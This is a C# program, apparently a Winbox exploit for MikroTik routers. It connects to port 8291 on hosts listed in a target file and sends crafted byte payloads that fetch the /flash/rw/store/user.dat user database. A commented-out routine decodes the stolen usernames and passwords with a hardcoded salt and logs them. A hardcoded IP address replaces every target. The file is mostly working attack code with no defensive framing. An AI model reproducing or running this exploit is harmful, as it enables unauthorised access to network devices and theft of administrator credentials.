using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

namespace WinboxExploitMikrotik
{
    class Program
    {
        private static byte[] PayloadA = {0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
                                        0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
                                        0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
                                        0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
                                        0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
                                        0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
                                        0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
                                        0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
                                        0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
                                        0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
                                        0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,     //payload to accessee: /flash/rw/store/user.dat
                                        0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
                                        0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
                                        0x00, 0x00};

        private static byte[] PayloadB = {0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
                                         0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
                                         0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
                                         0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
                                         0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
                                         0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
                                         0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
                                         0x00, 0x02, 0x00, 0x00, 0x00};

        private static string TargetFile = "output.txt";
        private static StreamReader Reader = new StreamReader(TargetFile);
        private static StreamWriter writer;
        private static int ThreadWorkerCount = 3;
        private static List<string> iplist = new List<string>();

        static void Main(string[] args)
        {
            if(args.Length == 0)
            {
                Console.WriteLine("Usage: dotnet run iplist.txt");
            }
            AppDomain.CurrentDomain.ProcessExit += new EventHandler(CurrentDomain_ProcessExit);
            string data = Reader.ReadToEnd();
            Reader.Close();
            writer = new StreamWriter(TargetFile);
            StreamReader ipReader = new StreamReader("target.txt");
            //StreamReader ipReader = new StreamReader(args[0]);
            writer.WriteLine(data);
            try
            {
                string regel = ipReader.ReadLine();
                while(regel != null)
                {
                    DoAttack(regel);
                    regel = ipReader.ReadLine();
                }
                        
            }
            catch(Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        static void CurrentDomain_ProcessExit(object sender, EventArgs e)
        {
            Console.WriteLine("Closing... ");
            writer.Close();
        }

        private static void DoAttack(string ip)
        {
            try {
                ip = "82.192.23.91";
                Console.WriteLine("[" + DateTime.UtcNow.ToString("yyyy/MM/dd hh:mm:ss.fffff") + "] " + ip + " ... ");
                MD5 md5Hash = MD5.Create();
                TcpClient client = new TcpClient();// (ip, 8291);
                client.SendTimeout = 5000;
                client.ReceiveTimeout = 5000;
                client.Connect(ip, 8291);
                NetworkStream stream = client.GetStream();
                var bw = new BinaryWriter(stream);
                var br = new BinaryReader(stream);
                bw.Write(PayloadA);
                bw.Flush();
                byte[] recvBuffer = new byte[1024];
                br.Read(recvBuffer);
                //Console.WriteLine("received id: 0x" + recvBuffer[38].ToString("X2"));
                PayloadB[19] = recvBuffer[38]; //change ID's
                bw.Write(PayloadB);
                bw.Flush();
                recvBuffer = new byte[2048];
                br.Read(recvBuffer);
                string LastUser = "";



                /*
                for (int i = 0; i < recvBuffer.Length; i++)
                {
                    if (recvBuffer[i] == 0x21)   //magic ! 
                    {
                        if (recvBuffer[i - 3] == 0x11) //Password (hashed)
                        {
                            string passwordHash = "";
                            for (int j = i + 2; j <= i + recvBuffer[i + 1] + 1; j++)
                                passwordHash += (char)recvBuffer[j];
                            //Decpde Password
                            byte[] hash = md5Hash.ComputeHash(Encoding.UTF8.GetBytes((LastUser + "283i4jfkai3389")));
                            string password = "";
                            for (int j = 0; j < passwordHash.Length; j++)
                            {
                                password += (char)(passwordHash[j] ^ hash[j % hash.Length]);
                            }
                            Console.WriteLine("Username: " + LastUser);
                            Console.WriteLine("password: " + password);
                            writer.WriteLine(ip + "," + LastUser + ":" + password);
                        }
                        else if (recvBuffer[i - 3] == 0x01) //username
                        {
                            string username = "";
                            for (int j = i + 2; j <= i + recvBuffer[i + 1] + 1; j++)
                                username += (char)recvBuffer[j];
                            LastUser = username;
                            //Console.WriteLine("username: " + username);
                        }
                    }
                }
                */
            }
            catch (SocketException e)
            {
                Console.WriteLine(e.Message.ToString());
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message.ToString());
            }
        }
    }
}
